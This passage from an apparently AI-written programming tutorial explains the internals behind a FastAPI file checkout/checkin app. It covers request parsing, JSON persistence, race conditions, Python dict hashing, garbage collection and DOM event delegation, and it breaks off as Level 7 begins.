```javascript
fetch("/api/files/checkout", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ filename: "test.mcam", message: "Working on it" }),
});
```

**2. Browser serializes to HTTP:**

```http
POST /api/files/checkout HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/json
Content-Length: 58

{"filename":"test.mcam","message":"Working on it"}
```

**Key headers:**

- `Content-Type`: Tells server how body is encoded
- `Content-Length`: Number of bytes in body (important for parsing)

**3. FastAPI receives and parses:**

```python
@app.post("/api/files/checkout")
async def checkout_file(request: CheckoutRequest):
    # FastAPI automatically:
    # 1. Reads Content-Length bytes from TCP socket
    # 2. Parses JSON (using C library for speed)
    # 3. Validates against CheckoutRequest Pydantic model
    # 4. Instantiates CheckoutRequest object
    # 5. Passes to your function
```

**What Pydantic does (the magic of type validation):**

```python
class CheckoutRequest(BaseModel):
    filename: str
    message: str

# Under the hood, Pydantic generates:
def __init__(self, **data):
    # Validate each field
    if 'filename' not in data:
        raise ValidationError('filename required')
    if not isinstance(data['filename'], str):
        raise ValidationError('filename must be string')

    # Same for message

    # If valid, set attributes
    self.filename = data['filename']
    self.message = data['message']
```

**This prevents entire classes of bugs:**

```python
# Without validation (dangerous):
filename = request_data['filename']  # KeyError if missing!
# filename could be None, a number, a list...

# With Pydantic (safe):
filename = request.filename  # Guaranteed to be a string
```

---

### **Part 2: State Management - The Fundamental Challenge**

Your tutorial stores locks in `locks.json`. This is a simple example of a much deeper concept: **persistent state**.

**The State Dichotomy:**

```
┌─────────────────────────────────────────────────┐
│            Application State                    │
├─────────────────────────────────────────────────┤
│                                                 │
│  Transient (In-Memory)     Persistent (Disk)   │
│  ────────────────────       ─────────────────   │
│  • Variables               • Files              │
│  • Function call stack     • Databases          │
│  • HTTP request objects    • Message queues     │
│                                                 │
│  Lost on restart           Survives restart     │
│  Fast access (ns)          Slow access (ms)     │
│  Limited by RAM            Limited by disk      │
└─────────────────────────────────────────────────┘
```

**Why we need persistent state:**

```python
# Without persistence:
locks = {}  # In-memory dictionary

@app.post("/api/files/checkout")
async def checkout(filename: str):
    locks[filename] = "user@example.com"
    return {"success": True}

# Problem: Restart server → locks = {} → all locks lost!
# Users think files are locked, but server forgot!
```

**Your solution:**

```python
locks = load_locks()  # Read from disk
locks[filename] = lock_info
save_locks(locks)     # Write to disk
```

---

### **JSON: Serialization and Deserialization**

**Serialization:** Converting data structure → bytes for storage/transmission  
**Deserialization:** Converting bytes → data structure

**JSON is a text-based serialization format:**

```python
# Python data structure (in memory)
locks = {
    "file1.mcam": {
        "user": "john",
        "timestamp": "2025-01-01T10:00:00Z"
    }
}

# Serialized to JSON (text)
'''
{
  "file1.mcam": {
    "user": "john",
    "timestamp": "2025-01-01T10:00:00Z"
  }
}
'''

# As bytes on disk (UTF-8 encoding)
b'{\n  "file1.mcam": {\n    "user": "john",\n ...'
```

**The `json.dump()` algorithm:**

```python
def json_dump(obj, file):
    # Type dispatch based on object type
    if isinstance(obj, dict):
        file.write('{')
        for i, (key, value) in enumerate(obj.items()):
            if i > 0: file.write(',')
            file.write(f'"{key}":')
            json_dump(value, file)  # Recursive call
        file.write('}')

    elif isinstance(obj, str):
        # Escape special characters
        escaped = obj.replace('"', '\\"').replace('\n', '\\n')
        file.write(f'"{escaped}"')

    elif isinstance(obj, (int, float)):
        file.write(str(obj))

    # ... etc for list, bool, None
```

**JSON parsing (the reverse):**

```python
def json_parse(text):
    # Tokenization (lexical analysis)
    tokens = tokenize(text)  # ['{', 'string', ':', 'string', '}']

    # Parsing (syntax analysis)
    return parse_value(tokens)

def parse_value(tokens):
    token = tokens.pop(0)

    if token == '{':
        return parse_object(tokens)
    elif token == '[':
        return parse_array(tokens)
    elif token[0] == '"':
        return token[1:-1]  # Remove quotes
    elif token in ('true', 'false'):
        return token == 'true'
    # ... etc
```

**Performance characteristics:**

```
Operation        Time Complexity    Space Complexity
─────────────────────────────────────────────────────
json.dumps()     O(n)              O(n)  (creates string)
json.loads()     O(n)              O(n)  (creates objects)

Where n = total size of data structure
```

**Why JSON instead of alternatives:**

```python
# Python pickle: Faster but not human-readable, not secure
import pickle
pickle.dumps(data)  # Binary format, can execute code!

# CSV: Simple but only for tabular data
# Can't represent nested structures

# XML: More verbose than JSON
<locks>
  <file>
    <name>file1.mcam</name>
    <user>john</user>
  </file>
</locks>

# JSON: Good balance of human-readable and efficient
```

---

### **File I/O: System Calls and Buffering**

```python
with open(LOCK_FILE, 'w') as f:
    json.dump(locks, f, indent=4)
```

**What happens at each layer:**

**1. Python level:**

```python
# 'with' statement uses context manager protocol
f = open(LOCK_FILE, 'w')  # Returns file object
try:
    json.dump(locks, f, indent=4)
finally:
    f.close()  # Ensures file closed even if exception
```

**2. File object buffering:**

```python
# Python maintains an in-memory buffer (typically 8KB)
f.write('{"file1.mcam": {"user": "john"}}')

# Doesn't immediately write to disk!
# Writes accumulate in buffer:
buffer = bytearray(8192)  # 8KB buffer
buffer[:38] = b'{"file1.mcam": {"user": "john"}}'

# Buffer flushes when:
# - Buffer full (8192 bytes)
# - f.flush() called explicitly
# - f.close() called
# - Program exits
```

**3. Operating system level:**

```python
# When buffer flushes, Python calls:
os.write(file_descriptor, buffer)

# This makes a system call:
syscall(SYS_write, fd, buffer, length)

# Kernel copies data to OS page cache (not disk yet!)
```

**4. Disk controller level:**

```
OS Page Cache → Disk Write Cache → Physical Disk

Timing:
- Page cache: Immediate (memory)
- Disk cache: Milliseconds
- Physical disk: Milliseconds to seconds

Until data reaches physical disk, it can be lost in power failure!
```

**Ensuring durability:**

```python
# For critical data, force to disk:
with open(LOCK_FILE, 'w') as f:
    json.dump(locks, f)
    f.flush()        # Flush Python buffer to OS
    os.fsync(f.fileno())  # Force OS to write to disk

# Slow but safe - now power failure won't lose data
```

---

### **Concurrency Problem: The Race Condition**

Your tutorial's biggest hidden danger:

```python
# Thread 1 (User A):
locks = load_locks()           # Read: {}
locks['file.mcam'] = 'userA'
save_locks(locks)              # Write: {'file.mcam': 'userA'}

# Thread 2 (User B) - runs simultaneously:
locks = load_locks()           # Read: {} (before Thread 1 writes!)
locks['file.mcam'] = 'userB'
save_locks(locks)              # Write: {'file.mcam': 'userB'} - OVERWRITES A!
```

**The race condition timeline:**

```
Time    Thread 1 (User A)         Thread 2 (User B)         locks.json
────────────────────────────────────────────────────────────────────────
t0      load_locks()                                        {}
t1                                load_locks()              {}
t2      locks['file'] = 'A'                                 {}
t3                                locks['file'] = 'B'       {}
t4      save_locks()                                        {'file':'A'}
t5                                save_locks()              {'file':'B'}

Result: User A's lock was overwritten! Both think they have the lock!
```

**Solutions (from simple to robust):**

**1. File locking (OS level):**

```python
import fcntl

def save_locks_safe(locks):
    with open(LOCK_FILE, 'w') as f:
        fcntl.flock(f.fileno(), fcntl.LOCK_EX)  # Exclusive lock
        json.dump(locks, f)
        # Lock automatically released on close
```

**2. Atomic operations (better):**

```python
def save_locks_atomic(locks):
    # Write to temporary file first
    temp_file = LOCK_FILE + '.tmp'
    with open(temp_file, 'w') as f:
        json.dump(locks, f)
        f.flush()
        os.fsync(f.fileno())

    # Atomic rename (OS guarantees this is atomic)
    os.rename(temp_file, LOCK_FILE)
    # Other processes see old file or new file, never partial write
```

**3. Database (professional solution):**

```python
# SQLite provides ACID guarantees
import sqlite3

def checkout_file(filename, user):
    conn = sqlite3.connect('locks.db')
    conn.execute('BEGIN EXCLUSIVE')  # Locks entire database

    # Check if already locked
    result = conn.execute(
        'SELECT user FROM locks WHERE filename = ?',
        (filename,)
    ).fetchone()

    if result:
        conn.rollback()
        raise Exception('Already locked')

    conn.execute(
        'INSERT INTO locks (filename, user) VALUES (?, ?)',
        (filename, user)
    )
    conn.commit()  # Atomic commit
```

---

### **ACID Properties: What Your File-Based System Lacks**

Professional databases guarantee ACID:

**A - Atomicity:**

- All or nothing (no partial updates)
- Your JSON: ❌ File could be half-written if process crashes

**C - Consistency:**

- Data follows all rules (constraints)
- Your JSON: ❌ No constraints enforced (could have invalid data)

**I - Isolation:**

- Concurrent operations don't interfere
- Your JSON: ❌ Race conditions possible

**D - Durability:**

- Committed data survives crashes
- Your JSON: ⚠️ Only if you use `fsync()`

**Why this matters:**

```python
# Without atomicity:
locks = load_locks()
locks['file1'] = 'user1'
locks['file2'] = 'user2'
save_locks(locks)  # ⚡ Process crashes here!

# File might contain:
'{"file1": "user1", "file2'  # Corrupted JSON!
```

---

### **The Request Object: What FastAPI Hides**

```python
async def checkout_file(request: CheckoutRequest):
```

**The full Request object (available if you need it):**

```python
from fastapi import Request

async def checkout_file(req: Request, data: CheckoutRequest):
    # req is a Starlette Request object containing:

    # URL information
    req.url           # Full URL
    req.path_params   # Path variables like {filename}
    req.query_params  # ?key=value pairs

    # Headers (dict-like object)
    req.headers['user-agent']
    req.headers['content-type']

    # Client info
    req.client.host   # IP address
    req.client.port   # Port number

    # Request body (raw bytes)
    body_bytes = await req.body()

    # Cookies
    req.cookies['session_id']

    # HTTP method
    req.method  # 'POST'
```

**How FastAPI constructs CheckoutRequest:**

```python
# FastAPI does this behind the scenes:
async def checkout_file_internal(req: Request):
    # 1. Read raw body
    body_bytes = await req.body()

    # 2. Decode based on Content-Type
    if req.headers['content-type'] == 'application/json':
        body_str = body_bytes.decode('utf-8')
        body_dict = json.loads(body_str)

    # 3. Validate with Pydantic
    try:
        data = CheckoutRequest(**body_dict)
    except ValidationError as e:
        # Return 422 Unprocessable Entity
        return JSONResponse(
            status_code=422,
            content={"detail": e.errors()}
        )

    # 4. Call your function
    return await checkout_file(data)
```

---

### **State Machines: Modeling Checkout/Checkin**

Your checkout system is a state machine:

```
                    ┌──────────────┐
                    │  AVAILABLE   │
                    └──────┬───────┘
                           │
                    checkout()
                           │
                           ↓
                    ┌──────────────┐
              ┌────→│ CHECKED_OUT  │────┐
              │     └──────────────┘    │
              │                         │
        checkout()                  checkin()
        (error)                         │
              │                         ↓
              │                  ┌──────────────┐
              └──────────────────│  AVAILABLE   │
                                 └──────────────┘
```

**Implementing as a state machine:**

```python
class FileState(Enum):
    AVAILABLE = "available"
    CHECKED_OUT = "checked_out"

class FileStateMachine:
    def __init__(self, filename):
        self.filename = filename
        self.state = FileState.AVAILABLE
        self.locked_by = None

    def checkout(self, user):
        # Guard condition: Check if transition is valid
        if self.state != FileState.AVAILABLE:
            raise InvalidTransition(
                f"Cannot checkout from state {self.state}"
            )

        # State transition
        self.state = FileState.CHECKED_OUT
        self.locked_by = user

    def checkin(self, user):
        # Guard condition
        if self.state != FileState.CHECKED_OUT:
            raise InvalidTransition(
                f"Cannot checkin from state {self.state}"
            )

        if self.locked_by != user:
            raise PermissionError(
                f"File locked by {self.locked_by}, not {user}"
            )

        # State transition
        self.state = FileState.AVAILABLE
        self.locked_by = None
```

**Benefits of explicit state machines:**

1. **Impossible states are impossible**: Can't be both available and locked
2. **Clear transition rules**: All valid state changes documented
3. **Easy testing**: Test each transition independently
4. **Self-documenting**: Code structure matches business rules

---

### **Practice Exercise: Race Condition Simulation**

Create this test to see race conditions in action:

```python
import asyncio
import json

LOCK_FILE = "test_locks.json"

async def checkout_unsafe(filename, user):
    """Simulates race condition"""
    # Read
    locks = json.load(open(LOCK_FILE))

    # Simulate network delay
    await asyncio.sleep(0.1)

    # Write
    locks[filename] = user
    json.dump(locks, open(LOCK_FILE, 'w'))

    return f"{user} locked {filename}"

async def test_race_condition():
    # Initialize
    json.dump({}, open(LOCK_FILE, 'w'))

    # Two users try to lock same file simultaneously
    results = await asyncio.gather(
        checkout_unsafe("file.mcam", "UserA"),
        checkout_unsafe("file.mcam", "UserB")
    )

    print(results)

    # Check final state
    locks = json.load(open(LOCK_FILE))
    print(f"Final lock holder: {locks['file.mcam']}")
    # Will be either UserA or UserB (random), but both think they succeeded!

asyncio.run(test_race_condition())
```

**Question:** How would you fix this to prevent the race condition?

**Hint:** Use `asyncio.Lock()` to serialize access to the file.

---

Ready for Level 6 (Completing the Loop - Checking In a File) when you've copied this section.

## **Level 6 Enhancement: Completing the Loop - Checking In a File**

**Reference:** Your tutorial adds a check-in endpoint that mirrors checkout and uses event delegation.

**Depth Needed:** Let me explain the fundamental computer science behind what makes this "complete the loop" and why event delegation is a critical pattern.

---

### **Part 1: Transactional Thinking - The Complete State Cycle**

**The Theoretical Foundation:**

In distributed systems and database theory, we distinguish between:

**Atomic Operations** (indivisible, single-step):

```python
x = 5  # Single assignment, happens "instantly"
```

**Transactions** (multi-step, must complete fully):

```python
# Checkout is part of a transaction:
# 1. Check if file is available
# 2. Update locks
# 3. Return success
# All three must succeed, or none should happen
```

**Your checkout/checkin forms a Transaction Lifecycle:**

```
State 1: AVAILABLE
    ↓
Transaction Start: checkout()
    ↓ (acquire lock)
State 2: CHECKED_OUT (working state)
    ↓
Transaction End: checkin()
    ↓ (release lock)
State 3: AVAILABLE (back to initial state)
```

**The Critical Property: Reversibility**

Every state change must have an inverse operation:

| Operation       | Inverse       | Mathematical Property          |
| --------------- | ------------- | ------------------------------ |
| checkout()      | checkin()     | f(f⁻¹(x)) = x                  |
| add_lock()      | remove_lock() | Bijection (one-to-one mapping) |
| increment_rev() | (no inverse)  | One-way function               |

**Why reversibility matters:**

```python
# Without reversibility (bad design):
@app.post("/api/files/checkout")
async def checkout(filename: str):
    locks[filename] = generate_random_id()  # Different each time!
    # Can't reverse because you lose the original state

# With reversibility (good design):
@app.post("/api/files/checkout")
async def checkout(filename: str):
    if filename in locks:
        raise AlreadyLocked()  # Can't proceed
    locks[filename] = user_info  # Deterministic change

@app.post("/api/files/checkin")
async def checkin(filename: str):
    del locks[filename]  # Exact inverse
    # Returns to precisely the original state
```

---

### **Dictionary Operations: The Hash Table Deep Dive**

Your code uses Python dictionaries extensively:

```python
locks[request.filename] = {...}  # Add/Update
del locks[request.filename]      # Delete
if request.filename in locks:    # Lookup
```

**What's actually happening in memory:**

Python's `dict` is implemented as a **hash table** with **open addressing**.

**The Hash Table Data Structure:**

```python
# Conceptual structure:
class HashTable:
    def __init__(self, size=8):
        self.size = size
        self.entries = [None] * size  # Array of (key, value) pairs
        self.count = 0

    def hash(self, key):
        # Python's hash function for strings
        h = 0
        for char in key:
            h = (h * 31 + ord(char)) & 0xFFFFFFFF  # Keep 32-bit
        return h % self.size  # Map to array index
```

**Insertion Algorithm (`locks[key] = value`):**

```python
def __setitem__(self, key, value):
    # 1. Compute hash
    index = self.hash(key)  # O(len(key)) for string hashing

    # 2. Handle collision with linear probing
    probe = 0
    while self.entries[index] is not None:
        existing_key, existing_value = self.entries[index]

        if existing_key == key:
            # Update existing key
            self.entries[index] = (key, value)
            return

        # Collision! Try next slot
        probe += 1
        index = (index + probe) % self.size

        if probe > self.size:
            # Table full - need to resize
            self._resize()
            return self.__setitem__(key, value)

    # 3. Found empty slot
    self.entries[index] = (key, value)
    self.count += 1

    # 4. Check load factor
    if self.count / self.size > 0.66:
        self._resize()  # Double size to maintain O(1) average
```

**Deletion Algorithm (`del locks[key]`):**

```python
def __delitem__(self, key):
    index = self.hash(key)
    probe = 0

    while self.entries[index] is not None:
        existing_key, _ = self.entries[index]

        if existing_key == key:
            # Can't just set to None - breaks probe chains!
            # Use a "tombstone" marker
            self.entries[index] = TOMBSTONE
            self.count -= 1
            return

        probe += 1
        index = (index + probe) % self.size

    raise KeyError(key)
```

**The Tombstone Problem:**

```python
# Why we need tombstones:
# 1. Insert "file1.mcam" at index 5
# 2. Insert "file2.mcam" - hashes to 5, collision, goes to index 6
# 3. Delete "file1.mcam" - set index 5 to None
# 4. Lookup "file2.mcam" - hashes to 5, sees None, stops searching!
#    Can't find "file2.mcam" even though it's at index 6!

# Solution: Use TOMBSTONE marker
# Tombstone says "keep searching, something was here"
```

**Time Complexity Analysis:**

```python
Operation     Average    Worst Case    Why worst case happens
─────────────────────────────────────────────────────────────
Insert        O(1)       O(n)          All keys hash to same index
Lookup        O(1)       O(n)          All keys hash to same index
Delete        O(1)       O(n)          Must search probe chain
Iteration     O(n)       O(n)          Must visit every slot

Where n = number of entries in dictionary
```

**Memory overhead:**

```python
# Python dict memory layout (64-bit system):
import sys

locks = {}
print(sys.getsizeof(locks))  # 240 bytes (empty dict)

locks["file1.mcam"] = {"user": "john"}
print(sys.getsizeof(locks))  # 240 bytes (still fits in initial allocation)

# Add many entries...
for i in range(100):
    locks[f"file{i}.mcam"] = {"user": "john"}
print(sys.getsizeof(locks))  # 9,328 bytes

# Memory = 72 + (8 * 3 * num_slots)
# Where num_slots = next_power_of_2(num_entries / 0.66)
```

**Load factor and resizing:**

```python
# Load factor = count / size
# Python maintains load factor < 0.66 (66% full)

# Why 0.66?
# - Higher load factor (0.9) → More collisions → Slower operations
# - Lower load factor (0.3) → Wastes memory → Frequent resizes

# Resizing operation:
def _resize(self):
    old_entries = self.entries
    self.size *= 2  # Double the size
    self.entries = [None] * self.size
    self.count = 0

    # Rehash all entries (O(n))
    for entry in old_entries:
        if entry is not None and entry != TOMBSTONE:
            key, value = entry
            self[key] = value  # Reinsert with new hash
```

---

### **Part 2: Event Delegation - The Memory-Efficient Pattern**

Your tutorial adds event delegation but doesn't explain WHY it's superior.

**The Naive Approach (Memory Inefficient):**

```javascript
// BAD: Attach listener to every button
document.querySelectorAll(".checkout-btn").forEach((button) => {
  button.addEventListener("click", handleCheckout);
});

// Problem: With 1000 files, this creates 1000 listener objects!
```

**Memory Analysis of Event Listeners:**

```javascript
// Each addEventListener creates a closure:
function addEventListener(type, handler) {
  // Browser creates internal data structure:
  const listener = {
    type: "click",
    handler: handler, // Reference to function
    element: this, // Reference to DOM element
    capture: false,
    passive: false,
    once: false,
  };

  // Stored in element's event listener list
  this._eventListeners.push(listener);
}

// With 1000 buttons:
// 1000 listeners × ~100 bytes each = ~100KB just for listeners
// Plus handler closures can capture scope (more memory)
```

**Event Delegation (Memory Efficient):**

```javascript
// GOOD: Single listener on container
fileListContainer.addEventListener("click", (event) => {
  if (event.target.classList.contains("checkout-btn")) {
    const filename = event.target.dataset.filename;
    handleCheckout(filename);
  }
});

// Only 1 listener object in memory regardless of number of buttons
```

---

### **The Event Propagation Algorithm (Deep Dive)**

When you click a button, THREE phases occur:

**Phase 1: Capture Phase (Top to Bottom)**

```html
<div id="file-list">
  <!-- Level 1 -->
  <div class="file-item">
    <!-- Level 2 -->
    <button class="checkout-btn">Checkout</button>
    <!-- Level 3 -->
  </div>
</div>
```

**The DOM tree traversal:**

```
Click event created at button (Level 3)

Capture Phase (rarely used):
document → html → body → #file-list → .file-item → button
  ↓         ↓      ↓         ↓            ↓          ↓
Can intercept at any level with capture: true
```

**Phase 2: Target Phase**

```
Event reaches the actual clicked element (button)
Calls listeners registered directly on button
```

**Phase 3: Bubble Phase (Bottom to Top)**

```
button → .file-item → #file-list → body → html → document
  ↓          ↓            ↓          ↓      ↓        ↓
This is where your listener on #file-list catches it
```

**The Browser's Event Dispatch Algorithm:**

```javascript
// Simplified browser implementation
function dispatchEvent(target, event) {
  // 1. Build propagation path (tree traversal)
  const path = [];
  let current = target;
  while (current !== null) {
    path.push(current);
    current = current.parentNode;
  }
  // path = [button, .file-item, #file-list, body, html, document]

  // 2. Capture phase (reverse order)
  event.eventPhase = Event.CAPTURING_PHASE;
  for (let i = path.length - 1; i > 0; i--) {
    const element = path[i];
    for (const listener of element._captureListeners) {
      if (event._stopPropagation) return;
      listener.handler(event);
    }
  }

  // 3. Target phase
  event.eventPhase = Event.AT_TARGET;
  for (const listener of target._listeners) {
    if (event._stopPropagation) return;
    listener.handler(event);
  }

  // 4. Bubble phase (forward order)
  event.eventPhase = Event.BUBBLING_PHASE;
  for (let i = 1; i < path.length; i++) {
    const element = path[i];
    for (const listener of element._listeners) {
      if (event._stopPropagation) return;
      listener.handler(event);
    }
  }
}
```

**Why event.target vs event.currentTarget:**

```javascript
fileListContainer.addEventListener("click", (event) => {
  console.log(event.target); // The button you clicked
  console.log(event.currentTarget); // fileListContainer (where listener is)
});

// event.target = where click originated (button)
// event.currentTarget = where listener is registered (container)
```

**The `.closest()` Method (Tree Search):**

```javascript
event.target.closest(".checkout-btn");
```

**What this does algorithmically:**

```javascript
// Implementation of closest()
Element.prototype.closest = function (selector) {
  let element = this;

  // Walk up the tree (depth-first search upward)
  while (element !== null) {
    if (element.matches(selector)) {
      return element; // Found!
    }
    element = element.parentElement;
  }

  return null; // Not found
};

// Time complexity: O(h) where h = height of tree from element to root
// Space complexity: O(1) - no extra memory needed
```

**Why `.closest()` is powerful:**

```html
<button class="checkout-btn">
  <span class="icon">📁</span>
  <!-- You might click this -->
  <span class="text">Checkout</span>
  <!-- Or this -->
</button>
```

```javascript
// Without closest():
if (event.target.classList.contains("checkout-btn")) {
  // Only works if you click the button itself, not the spans!
}

// With closest():
if (event.target.closest(".checkout-btn")) {
  // Works no matter which part of the button you click
}
```

---

### **CSS Selector Matching (How .contains() Works)**

```javascript
event.target.classList.contains("checkout-btn");
```

**The classList object:**

```javascript
// DOMTokenList (browser implementation)
class DOMTokenList {
  constructor(element) {
    this._element = element;
    this._tokens = null; // Lazy initialization
  }

  get _tokenSet() {
    if (this._tokens === null) {
      // Parse className into Set
      const className = this._element.className || "";
      this._tokens = new Set(className.trim().split(/\s+/));
    }
    return this._tokens;
  }

  contains(token) {
    // O(1) lookup in Set (hash table)
    return this._tokenSet.has(token);
  }

  add(token) {
    this._tokenSet.add(token);
    this._sync(); // Update element.className
  }

  _sync() {
    // Convert Set back to space-separated string
    this._element.className = Array.from(this._tokens).join(" ");
  }
}
```

**Time Complexity:**

```javascript
Operation                           Time Complexity
─────────────────────────────────────────────────────
classList.contains('x')             O(1) average
classList.add('x')                  O(1) average + O(n) for sync
classList.remove('x')               O(1) average + O(n) for sync
classList.toggle('x')               O(1) average + O(n) for sync

Where n = number of classes on element (for string join)
```

**Alternative: Using data attributes for metadata:**

```javascript
// Your tutorial uses data-filename attribute
button.dataset.filename;

// How this works:
Object.defineProperty(HTMLElement.prototype, "dataset", {
  get() {
    // Lazy parsing of data-* attributes
    const dataset = {};
    for (let i = 0; i < this.attributes.length; i++) {
      const attr = this.attributes[i];
      if (attr.name.startsWith("data-")) {
        // Convert data-file-name to fileName (camelCase)
        const key = attr.name
          .substring(5) // Remove 'data-'
          .replace(/-([a-z])/g, (_, char) => char.toUpperCase());
        dataset[key] = attr.value;
      }
    }
    return dataset;
  },
});

// Time complexity: O(a) where a = number of attributes
// Parsed every time you access .dataset (not cached!)
```

**Performance optimization:**

```javascript
// SLOW: Accesses dataset multiple times
if (event.target.dataset.filename) {
  const name = event.target.dataset.filename; // Parses again
  handleCheckout(event.target.dataset.filename); // And again!
}

// FAST: Cache the result
const target = event.target;
const filename = target.dataset.filename;
if (filename) {
  handleCheckout(filename);
}
```

---

### **Part 3: Symmetry in API Design**

Your tutorial creates mirror endpoints. This is a formal design principle.

**The Principle of Symmetry:**

For every operation that creates state, there should be an operation that removes it:

```python
Operation Pairs (Symmetric):
────────────────────────────────────
POST   /api/files/checkout    ↔   POST   /api/files/checkin
POST   /api/users             ↔   DELETE /api/users/{id}
PUT    /api/files/{id}        ↔   DELETE /api/files/{id}
```

**Why POST for checkin instead of DELETE?**

```python
# DELETE is typically for removing resources entirely
DELETE /api/files/{filename}  # Deletes the file itself

# POST is for state transitions
POST /api/files/checkin       # Changes file state, doesn't delete it
```

**HTTP Method Semantics (Formal Specification):**

| Method | Idempotent? | Safe? | Use Case                          |
| ------ | ----------- | ----- | --------------------------------- |
| GET    | ✓           | ✓     | Retrieve resource                 |
| POST   | ✗           | ✗     | Create resource or trigger action |
| PUT    | ✓           | ✗     | Replace resource entirely         |
| PATCH  | ✗           | ✗     | Modify resource partially         |
| DELETE | ✓           | ✗     | Remove resource                   |

**Why POST /checkin is NOT idempotent:**

```python
# First call: Success
POST /api/files/checkin { "filename": "test.mcam" }
→ 200 OK, file is now available

# Second call: Error
POST /api/files/checkin { "filename": "test.mcam" }
→ 404 Not Found, file is not checked out

# Different results! Not idempotent.
```

**Designing an idempotent checkin (theoretical):**

```python
# Use PUT with full state
PUT /api/files/test.mcam/lock { "locked": false }

# First call:  locked: true → false (200 OK)
# Second call: locked: false → false (200 OK)
# Same result! Idempotent.
```

---

### **Error Status Codes: The State Diagram**

```python
if request.filename not in locks:
    raise HTTPException(status_code=404, detail="File is not currently checked out.")
```

**Why 404 (Not Found)?**

HTTP status codes form a **decision tree**:

```
Is the request valid?
├─ No → 4xx Client Error
│       ├─ Syntax error → 400 Bad Request
│       ├─ Not authenticated → 401 Unauthorized
│       ├─ Authenticated but forbidden → 403 Forbidden
│       ├─ Resource doesn't exist → 404 Not Found
│       ├─ Method not allowed → 405 Method Not Allowed
│       ├─ Conflict with current state → 409 Conflict
│       └─ Invalid data format → 422 Unprocessable Entity
│
└─ Yes → Is the server working?
        ├─ No → 5xx Server Error
        │       ├─ Generic error → 500 Internal Server Error
        │       ├─ Not implemented → 501 Not Implemented
        │       ├─ Gateway timeout → 504 Gateway Timeout
        │       └─ Service unavailable → 503 Service Unavailable
        │
        └─ Yes → 2xx Success
                ├─ Created new resource → 201 Created
                ├─ Success, no content → 204 No Content
                └─ Success with content → 200 OK
```

**Choosing the right status code:**

```python
# Scenario: Try to checkin file that's not checked out

# Option 1: 404 Not Found
# Interpretation: The lock doesn't exist
# Correct! The lock is a resource, and it's not found.
raise HTTPException(status_code=404)

# Option 2: 409 Conflict
# Interpretation: Request conflicts with current state
# Also valid! File is in wrong state for this operation.
raise HTTPException(status_code=409)

# Option 3: 422 Unprocessable Entity
# Interpretation: Request is syntactically correct but semantically invalid
# Less appropriate - request format is fine, it's the state that's wrong.

# Best choice: 404 (treat lock as a resource)
```

---

### **The JSON Response Format (Structure Deep Dive)**

```python
return {"success": True, "message": f"File '{request.filename}' checked in successfully."}
```

**Why structure responses this way?**

**Envelope Pattern:**

```python
# Basic response (no envelope)
return {"user": "john", "email": "john@example.com"}

# Problem: What if there's an error? Structure changes completely!
return {"error": "User not found"}

# Envelope pattern (consistent structure)
# Success:
{
    "success": true,
    "data": {"user": "john", "email": "john@example.com"},
    "error": null
}

# Error:
{
    "success": false,
    "data": null,
    "error": {"code": "NOT_FOUND", "message": "User not found"}
}
```

**Frontend can always expect the same structure:**

```javascript
fetch('/api/files/checkin', {...})
    .then(r => r.json())
    .then(response => {
        if (response.success) {
            // Handle success
            console.log(response.message);
        } else {
            // Handle error
            console.error(response.error);
        }
    });
```

**Alternative: HTTP status codes (RESTful approach):**

```python
# Success response (200 OK)
return {"user": "john", "email": "john@example.com"}

# Error response (404 Not Found)
raise HTTPException(
    status_code=404,
    detail={"error": "User not found"}
)

# Frontend checks response.ok:
if (response.ok) {
    // Success
} else {
    // Error - check response.status
}
```

---

### **Memory Management: Garbage Collection**

```python
del locks[request.filename]
```

**What happens to the deleted entry?**

**Python's Garbage Collection (Reference Counting + Cycle Detection):**

```python
# Before deletion:
locks = {
    "file1.mcam": {"user": "john", "timestamp": "..."},
    "file2.mcam": {"user": "jane", "timestamp": "..."}
}

# Reference count for {"user": "john", ...} = 1 (referenced by locks dict)

# After deletion:
del locks["file1.mcam"]
# Reference count for {"user": "john", ...} drops to 0
# Python immediately frees the memory (deterministic)
```

**Reference Counting Algorithm:**

```python
# Every Python object has a header:
class PyObject:
    def __init__(self, value):
        self.ob_refcnt = 1  # Reference count
        self.ob_type = type(value)
        self.ob_value = value

# When you assign:
x = {"user": "john"}  # ob_refcnt = 1
y = x                 # ob_refcnt = 2 (two variables point to it)

# When you delete:
del x                 # ob_refcnt = 1 (still referenced by y)
del y                 # ob_refcnt = 0 → FREED IMMEDIATELY
```

**The Cycle Problem:**

```python
# Reference cycle (neither can be freed):
a = {}
b = {}
a['ref'] = b  # a references b
b['ref'] = a  # b references a
del a, b      # Both still have refcount > 0!

# Memory leak without cycle detector
```

**Python's Cycle Detector (Generational GC):**

```python
# Python divides objects into 3 generations:
generation_0 = []  # Young objects (most likely to be garbage)
generation_1 = []  # Middle-aged
generation_2 = []  # Old objects (least likely to be garbage)

# GC runs when generation_0 fills up:
def collect_generation_0():
    # 1. Mark phase: Find all reachable objects
    reachable = set()
    for root in get_root_objects():  # Globals, stack, etc.
        mark_reachable(root, reachable)

    # 2. Sweep phase: Free unreachable objects
    for obj in generation_0:
        if obj not in reachable:
            free_object(obj)
        else:
            # Survived collection - promote to generation_1
            generation_1.append(obj)
```

**Implications for your application:**

```python
# Each time you check in:
del locks[filename]  # Instant deallocation (no GC needed)

# But if you have circular references:
lock_info = {
    "user": "john",
    "file": file_obj
}
file_obj["lock"] = lock_info  # Circular reference!
del locks[filename]  # Requires GC to clean up
```

---

### **Practice Exercise: Event Delegation Efficiency**

Measure the performance difference:

```javascript
// Setup: Create 1000 buttons
const container = document.getElementById("test-container");
for (let i = 0; i < 1000; i++) {
  container.innerHTML += `<button class="btn-${i}">Button ${i}</button>`;
}

// Method 1: Individual listeners
console.time("individual-listeners");
document.querySelectorAll('[class^="btn-"]').forEach((btn) => {
  btn.addEventListener("click", () => console.log("clicked"));
});
console.timeEnd("individual-listeners");

// Method 2: Delegation
console.time("delegated-listener");
container.addEventListener("click", (e) => {
  if (e.target.tagName === "BUTTON") {
    console.log("clicked");
  }
});
console.timeEnd("delegated-listener");

// Measure memory:
// Chrome DevTools → Memory → Take Heap Snapshot
// Compare "Listeners" count between methods
```

**Expected results:**

- Individual: ~50-100ms setup time, ~100KB memory
- Delegated: ~1ms setup time, ~1KB memory

---

Ready for Level 7 (Richer State & UI - Checkout Messages and Modals) when you've absorbed this material. The next level will dive into modal dialogs, z-index stacking contexts, and the datetime serialization problem.

## **Level 7 Enhancement: Richer State & UI - Checkout Messages and Modals**

**Reference:** Your tutorial evolves the data model from storing strings to objects in `locks.json`, and introduces modal dialogs.

